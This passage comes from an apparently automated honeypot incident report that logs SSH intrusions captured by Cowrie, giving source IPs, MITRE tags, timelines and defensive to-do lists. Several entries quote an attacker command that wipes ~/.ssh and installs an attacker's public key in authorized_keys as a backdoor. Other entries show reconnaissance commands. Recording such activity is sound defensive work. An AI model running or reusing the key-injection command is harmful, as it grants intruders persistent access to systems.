| `2026-08-08 03:31:07` | `cowrie.command.failed` |
| `2026-08-08 03:31:07` | `cowrie.log.closed` |
| `2026-08-08 03:31:08` | `cowrie.session.params` |
| `2026-08-08 03:31:08` | `cowrie.command.input` |
| `2026-08-08 03:31:08` | `cowrie.session.file_download` |
| `2026-08-08 03:31:08` | `cowrie.log.closed` |
| `2026-08-08 03:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab94893b2dc5

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-08-08 03:31 |
| **Last Seen** | 2026-08-08 03:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:31:08` | `cowrie.session.connect` |
| `2026-08-08 03:31:08` | `cowrie.client.version` |
| `2026-08-08 03:31:08` | `cowrie.client.kex` |
| `2026-08-08 03:31:08` | `cowrie.login.success` |
| `2026-08-08 03:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4fba6d1bec1

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-08-08 03:31 |
| **Last Seen** | 2026-08-08 03:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:31:09` | `cowrie.session.connect` |
| `2026-08-08 03:31:09` | `cowrie.client.version` |
| `2026-08-08 03:31:09` | `cowrie.client.kex` |
| `2026-08-08 03:31:09` | `cowrie.login.success` |
| `2026-08-08 03:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e39aa9c84bc

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]134` |
| **First Seen** | 2026-08-08 03:31 |
| **Last Seen** | 2026-08-08 03:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:31:31` | `cowrie.session.connect` |
| `2026-08-08 03:31:31` | `cowrie.client.version` |
| `2026-08-08 03:31:31` | `cowrie.client.kex` |
| `2026-08-08 03:31:32` | `cowrie.login.success` |
| `2026-08-08 03:31:32` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]134` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24031fb0a187

| Field | Detail |
|---|---|
| **Source IP** | `61.145.181[.]7` |
| **First Seen** | 2026-08-08 03:31 |
| **Last Seen** | 2026-08-08 03:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:31:37` | `cowrie.session.connect` |
| `2026-08-08 03:31:38` | `cowrie.client.version` |
| `2026-08-08 03:31:38` | `cowrie.client.kex` |
| `2026-08-08 03:31:41` | `cowrie.login.success` |
| `2026-08-08 03:31:42` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.181[.]7` to AbuseIPDB if not already reported
- [ ] Block `61.145.181[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a193c0a63959

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:31 |
| **Last Seen** | 2026-08-08 03:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:31:49` | `cowrie.session.connect` |
| `2026-08-08 03:31:49` | `cowrie.client.version` |
| `2026-08-08 03:31:49` | `cowrie.client.kex` |
| `2026-08-08 03:31:49` | `cowrie.login.success` |
| `2026-08-08 03:31:50` | `cowrie.session.params` |
| `2026-08-08 03:31:50` | `cowrie.command.input` |
| `2026-08-08 03:31:50` | `cowrie.log.closed` |
| `2026-08-08 03:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf9cca16a31

| Field | Detail |
|---|---|
| **Source IP** | `119.18.52[.]5` |
| **First Seen** | 2026-08-08 03:33 |
| **Last Seen** | 2026-08-08 03:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:33:13` | `cowrie.session.connect` |
| `2026-08-08 03:33:13` | `cowrie.client.version` |
| `2026-08-08 03:33:13` | `cowrie.client.kex` |
| `2026-08-08 03:33:14` | `cowrie.login.success` |
| `2026-08-08 03:33:15` | `cowrie.session.params` |
| `2026-08-08 03:33:15` | `cowrie.command.input` |
| `2026-08-08 03:33:15` | `cowrie.command.failed` |
| `2026-08-08 03:33:16` | `cowrie.log.closed` |
| `2026-08-08 03:33:16` | `cowrie.session.params` |
| `2026-08-08 03:33:16` | `cowrie.command.input` |
| `2026-08-08 03:33:17` | `cowrie.session.file_download` |
| `2026-08-08 03:33:17` | `cowrie.log.closed` |
| `2026-08-08 03:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.52[.]5` to AbuseIPDB if not already reported
- [ ] Block `119.18.52[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abee7e5170a

| Field | Detail |
|---|---|
| **Source IP** | `119.18.52[.]5` |
| **First Seen** | 2026-08-08 03:33 |
| **Last Seen** | 2026-08-08 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:33:17` | `cowrie.session.connect` |
| `2026-08-08 03:33:17` | `cowrie.client.version` |
| `2026-08-08 03:33:17` | `cowrie.client.kex` |
| `2026-08-08 03:33:18` | `cowrie.login.success` |
| `2026-08-08 03:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.52[.]5` to AbuseIPDB if not already reported
- [ ] Block `119.18.52[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418d9db8145a

| Field | Detail |
|---|---|
| **Source IP** | `119.18.52[.]5` |
| **First Seen** | 2026-08-08 03:33 |
| **Last Seen** | 2026-08-08 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:33:19` | `cowrie.session.connect` |
| `2026-08-08 03:33:19` | `cowrie.client.version` |
| `2026-08-08 03:33:19` | `cowrie.client.kex` |
| `2026-08-08 03:33:20` | `cowrie.login.success` |
| `2026-08-08 03:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.52[.]5` to AbuseIPDB if not already reported
- [ ] Block `119.18.52[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbcfe49558b6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:33 |
| **Last Seen** | 2026-08-08 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:33:33` | `cowrie.session.connect` |
| `2026-08-08 03:33:33` | `cowrie.client.version` |
| `2026-08-08 03:33:33` | `cowrie.client.kex` |
| `2026-08-08 03:33:34` | `cowrie.login.success` |
| `2026-08-08 03:33:35` | `cowrie.session.params` |
| `2026-08-08 03:33:35` | `cowrie.command.input` |
| `2026-08-08 03:33:35` | `cowrie.log.closed` |
| `2026-08-08 03:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cce53882571

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-08-08 03:33 |
| **Last Seen** | 2026-08-08 03:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:33:42` | `cowrie.session.connect` |
| `2026-08-08 03:33:42` | `cowrie.client.version` |
| `2026-08-08 03:33:43` | `cowrie.client.kex` |
| `2026-08-08 03:33:44` | `cowrie.login.success` |
| `2026-08-08 03:33:45` | `cowrie.session.params` |
| `2026-08-08 03:33:45` | `cowrie.command.input` |
| `2026-08-08 03:33:45` | `cowrie.command.failed` |
| `2026-08-08 03:33:45` | `cowrie.log.closed` |
| `2026-08-08 03:33:46` | `cowrie.session.params` |
| `2026-08-08 03:33:46` | `cowrie.command.input` |
| `2026-08-08 03:33:46` | `cowrie.session.file_download` |
| `2026-08-08 03:33:46` | `cowrie.log.closed` |
| `2026-08-08 03:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71efe0beac86

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-08-08 03:33 |
| **Last Seen** | 2026-08-08 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:33:47` | `cowrie.session.connect` |
| `2026-08-08 03:33:47` | `cowrie.client.version` |
| `2026-08-08 03:33:47` | `cowrie.client.kex` |
| `2026-08-08 03:33:48` | `cowrie.login.success` |
| `2026-08-08 03:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31fc2baa9b3

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-08-08 03:33 |
| **Last Seen** | 2026-08-08 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:33:48` | `cowrie.session.connect` |
| `2026-08-08 03:33:48` | `cowrie.client.version` |
| `2026-08-08 03:33:48` | `cowrie.client.kex` |
| `2026-08-08 03:33:49` | `cowrie.login.success` |
| `2026-08-08 03:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f6d5877b12

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-08 03:34 |
| **Last Seen** | 2026-08-08 03:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:34:00` | `cowrie.session.connect` |
| `2026-08-08 03:34:00` | `cowrie.client.version` |
| `2026-08-08 03:34:00` | `cowrie.client.kex` |
| `2026-08-08 03:34:01` | `cowrie.login.success` |
| `2026-08-08 03:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a02de896a48b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-08 03:34 |
| **Last Seen** | 2026-08-08 03:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:34:00` | `cowrie.session.connect` |
| `2026-08-08 03:34:00` | `cowrie.client.version` |
| `2026-08-08 03:34:01` | `cowrie.client.kex` |
| `2026-08-08 03:34:01` | `cowrie.login.success` |
| `2026-08-08 03:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e19e2ce9511

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 03:35 |
| **Last Seen** | 2026-08-08 03:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:35:13` | `cowrie.session.connect` |
| `2026-08-08 03:35:13` | `cowrie.client.version` |
| `2026-08-08 03:35:13` | `cowrie.client.kex` |
| `2026-08-08 03:35:13` | `cowrie.login.success` |
| `2026-08-08 03:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f9f9a22995

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 03:35 |
| **Last Seen** | 2026-08-08 03:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:35:14` | `cowrie.session.connect` |
| `2026-08-08 03:35:14` | `cowrie.client.version` |
| `2026-08-08 03:35:14` | `cowrie.client.kex` |
| `2026-08-08 03:35:14` | `cowrie.login.success` |
| `2026-08-08 03:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48909080d760

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 03:35 |
| **Last Seen** | 2026-08-08 03:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:35:16` | `cowrie.session.connect` |
| `2026-08-08 03:35:16` | `cowrie.client.version` |
| `2026-08-08 03:35:16` | `cowrie.client.kex` |
| `2026-08-08 03:35:16` | `cowrie.login.success` |
| `2026-08-08 03:35:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f02eeb3a0547

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 03:35 |
| **Last Seen** | 2026-08-08 03:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:35:16` | `cowrie.session.connect` |
| `2026-08-08 03:35:16` | `cowrie.client.version` |
| `2026-08-08 03:35:16` | `cowrie.client.kex` |
| `2026-08-08 03:35:16` | `cowrie.login.success` |
| `2026-08-08 03:35:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92bf22988fbf

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:35 |
| **Last Seen** | 2026-08-08 03:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:35:23` | `cowrie.session.connect` |
| `2026-08-08 03:35:23` | `cowrie.client.version` |
| `2026-08-08 03:35:23` | `cowrie.client.kex` |
| `2026-08-08 03:35:23` | `cowrie.login.success` |
| `2026-08-08 03:35:24` | `cowrie.session.params` |
| `2026-08-08 03:35:24` | `cowrie.command.input` |
| `2026-08-08 03:35:24` | `cowrie.log.closed` |
| `2026-08-08 03:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28e5bc1314b1

| Field | Detail |
|---|---|
| **Source IP** | `51.75.161[.]33` |
| **First Seen** | 2026-08-08 03:35 |
| **Last Seen** | 2026-08-08 03:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:35:37` | `cowrie.session.connect` |
| `2026-08-08 03:35:37` | `cowrie.client.version` |
| `2026-08-08 03:35:38` | `cowrie.client.kex` |
| `2026-08-08 03:35:38` | `cowrie.login.success` |
| `2026-08-08 03:35:39` | `cowrie.session.params` |
| `2026-08-08 03:35:39` | `cowrie.command.input` |
| `2026-08-08 03:35:39` | `cowrie.command.failed` |
| `2026-08-08 03:35:39` | `cowrie.log.closed` |
| `2026-08-08 03:35:39` | `cowrie.session.params` |
| `2026-08-08 03:35:39` | `cowrie.command.input` |
| `2026-08-08 03:35:40` | `cowrie.session.file_download` |
| `2026-08-08 03:35:40` | `cowrie.log.closed` |
| `2026-08-08 03:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.161[.]33` to AbuseIPDB if not already reported
- [ ] Block `51.75.161[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-256412ce8f8f

| Field | Detail |
|---|---|
| **Source IP** | `51.75.161[.]33` |
| **First Seen** | 2026-08-08 03:35 |
| **Last Seen** | 2026-08-08 03:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:35:40` | `cowrie.session.connect` |
| `2026-08-08 03:35:40` | `cowrie.client.version` |
| `2026-08-08 03:35:40` | `cowrie.client.kex` |
| `2026-08-08 03:35:40` | `cowrie.login.success` |
| `2026-08-08 03:35:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.161[.]33` to AbuseIPDB if not already reported
- [ ] Block `51.75.161[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f216c76e7c92

| Field | Detail |
|---|---|
| **Source IP** | `51.75.161[.]33` |
| **First Seen** | 2026-08-08 03:35 |
| **Last Seen** | 2026-08-08 03:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:35:40` | `cowrie.session.connect` |
| `2026-08-08 03:35:40` | `cowrie.client.version` |
| `2026-08-08 03:35:40` | `cowrie.client.kex` |
| `2026-08-08 03:35:41` | `cowrie.login.success` |
| `2026-08-08 03:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.161[.]33` to AbuseIPDB if not already reported
- [ ] Block `51.75.161[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90e2c5643228

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]210` |
| **First Seen** | 2026-08-08 03:36 |
| **Last Seen** | 2026-08-08 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:36:14` | `cowrie.session.connect` |
| `2026-08-08 03:36:15` | `cowrie.login.success` |
| `2026-08-08 03:36:16` | `cowrie.session.params` |
| `2026-08-08 03:36:16` | `cowrie.log.closed` |
| `2026-08-08 03:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]210` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72bb0dd6aebd

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]210` |
| **First Seen** | 2026-08-08 03:36 |
| **Last Seen** | 2026-08-08 03:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, uname -m, cat /proc/cpuinfo, /bin/busybox TEST, cat /proc` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:36:16` | `cowrie.session.connect` |
| `2026-08-08 03:36:17` | `cowrie.login.success` |
| `2026-08-08 03:36:17` | `cowrie.session.params` |
| `2026-08-08 03:36:18` | `cowrie.command.input` |
| `2026-08-08 03:36:18` | `cowrie.command.input` |
| `2026-08-08 03:36:19` | `cowrie.command.input` |
| `2026-08-08 03:36:19` | `cowrie.command.input` |
| `2026-08-08 03:36:20` | `cowrie.command.input` |
| `2026-08-08 03:36:21` | `cowrie.command.input` |
| `2026-08-08 03:36:21` | `cowrie.command.failed` |
| `2026-08-08 03:36:21` | `cowrie.log.closed` |
| `2026-08-08 03:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]210` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab16d0938de6

| Field | Detail |
|---|---|
| **Source IP** | `209.38.121[.]186` |
| **First Seen** | 2026-08-08 03:36 |
| **Last Seen** | 2026-08-08 03:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
